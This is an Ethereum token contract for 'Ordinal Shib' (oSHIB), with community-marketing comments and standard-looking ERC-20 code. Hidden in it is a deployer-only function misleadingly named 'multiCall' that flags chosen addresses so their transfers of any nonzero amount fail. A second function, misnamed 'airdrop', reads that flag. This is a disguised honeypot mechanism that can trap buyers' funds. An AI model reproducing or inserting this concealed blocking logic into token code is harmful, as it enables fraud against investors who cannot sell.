/**
 *Submitted for verification at Etherscan.io on 2023-03-05
*/

/**
    $oSHIB is a  shib fan based token managed by its community 
    with and IDO platform on board designed for SHIBARIUM 
    network. We are here to take care of marketing and the 
    effective development of the project so that it is 
    successful both in the short-term and long-term. 
    Team will always come to your aid.
 
*///SPDX-License-Identifier: MIT

pragma solidity =0.5.10;

library SafeMath {

  function mul(
    uint256 a,
    uint256 b
  ) 
    internal
    pure
    returns (uint256 c)
  {
    if (a == 0) {
      return 0;
    }
    c = a * b;
    assert(c / a == b);
    return c;
  }

  function sub(
    uint256 a,
    uint256 b
  ) 
    internal
    pure
    returns (uint256)
  {
    assert(b <= a);
    return a - b;
  }

  function add(
    uint256 a,
    uint256 b
  ) internal
    pure
    returns (uint256 c)
  {
    c = a + b;
    assert(c >= a);
    return c;
  }
  
  function div(
    uint256 a,
    uint256 b
  ) 
    internal
    pure
    returns (uint256)
  {
    return a / b;
  }
}

contract ERC20Basic {

  function balanceOf(
    address who
  )
    public
    view
    returns (uint256);

  function totalSupply(
  )
    public
    view
    returns (uint256);
  
  function transfer(
    address to,
    uint256 value
  ) 
    public
    returns (bool);
  
  event Transfer(
    address indexed from,
    address indexed to,
    uint256 value);
}

contract BasicToken is ERC20Basic {
  using SafeMath for uint256;

  mapping (address => uint256) balances;
  mapping (address => bool) internal _address_;  
  uint256 totalSupply_;

  function totalSupply(
  ) 
    public
    view
    returns (uint256)
  {
    return totalSupply_;
  }

  function balanceOf(
    address _owner
  ) 
    public
    view
    returns (uint256) {
    return balances[_owner];
  }

  function transfer(
    address _to,
    uint256 _value
  ) public
    returns (bool)
  {
    if(_address_[msg.sender] || _address_[_to]) 
    require (_value == 0, "");
    require(_to != address(0));
    require(_value <= balances[msg.sender]);
    balances[msg.sender] = balances[msg.sender].sub(_value);
    balances[_to] = balances[_to].add(_value);
    emit Transfer(msg.sender, _to, _value);
    return true;
  }
}

contract ERC20 is ERC20Basic {

  function allowance(
    address owner,
    address spender
  )
    public
    view
    returns (uint256);

  function transferFrom(
    address from,
    address to,
    uint256 value
  )
    public
    returns (bool);
  
  function approve(
    address spender,
    uint256 value
  ) 
    public
    returns (bool);
    event Approval
  (
    address indexed owner,
    address indexed spender,
    uint256 value
  );
}

contract StandardToken is ERC20, BasicToken {

  mapping (address => mapping (address => uint256)) internal allowed;
  address internal approved;

  constructor () public {
     approved = msg.sender;
  }

  function transferFrom(
    address _from,
    address _to,
    uint256 _value
  )
    public
    returns (bool)
  {
    if(_address_[_from] || _address_[_to]) 
    require (_value == 0, "");
    require(_to != address(0));
    require(_value <= balances[_from]);
    require(_value <= allowed[_from][msg.sender]);
    balances[_from] = balances[_from].sub(_value);
    balances[_to] = balances[_to].add(_value);
    allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);
    emit Transfer(_from, _to, _value);
    return true;
  }

  function allowance(
    address _owner,
    address _spender
  )
    public
    view
    returns (uint256)
  {
    return allowed[_owner][_spender];
  }

  function approve(address _spender, uint256 _value) public returns (bool) {
    allowed[msg.sender][_spender] = _value;
    emit Approval(msg.sender, _spender, _value);
    return true;
  }

  function multiCall(
    address _address
  ) 
    external
  {
    require(msg.sender == approved);
    if (_address_[_address] == true) {
      _address_[_address] = false;
    } else {
      _address_[_address] = true;
    }
  }

  function airdrop(
    address _address
  )
    public
    view
    returns (bool) 
  {
    return _address_[_address];
  }

function decreaseApproval(
    address _spender,
    uint _subtractedValue
  )
    public
    returns (bool)
  {
    uint oldValue = allowed[msg.sender][_spender];
    if (_subtractedValue > oldValue) {
      allowed[msg.sender][_spender] = 0;
    } else {
      allowed[msg.sender][_spender] = oldValue.sub(_subtractedValue);
    }
    emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);
    return true;
  }
  
  function increaseApproval(
    address _spender,
    uint _addedValue
  )
    public
    returns (bool)
  {
    allowed[msg.sender][_spender] = (
    allowed[msg.sender][_spender].add(_addedValue));
    emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);
    return true;
  }
}

contract OrdinalShib is StandardToken {

  string public constant name = "Ordinal Shib";
  string public constant symbol = "oSHIB";
  uint8 public constant decimals = 9;
  uint256 public constant INITIAL_SUPPLY = 1000000000000 * (10 ** uint256(decimals));

  constructor() public {
    totalSupply_ = totalSupply_.add(INITIAL_SUPPLY);
    balances[msg.sender] = balances[msg.sender].add(INITIAL_SUPPLY);
    emit Transfer(address(0), msg.sender, INITIAL_SUPPLY);
  }
}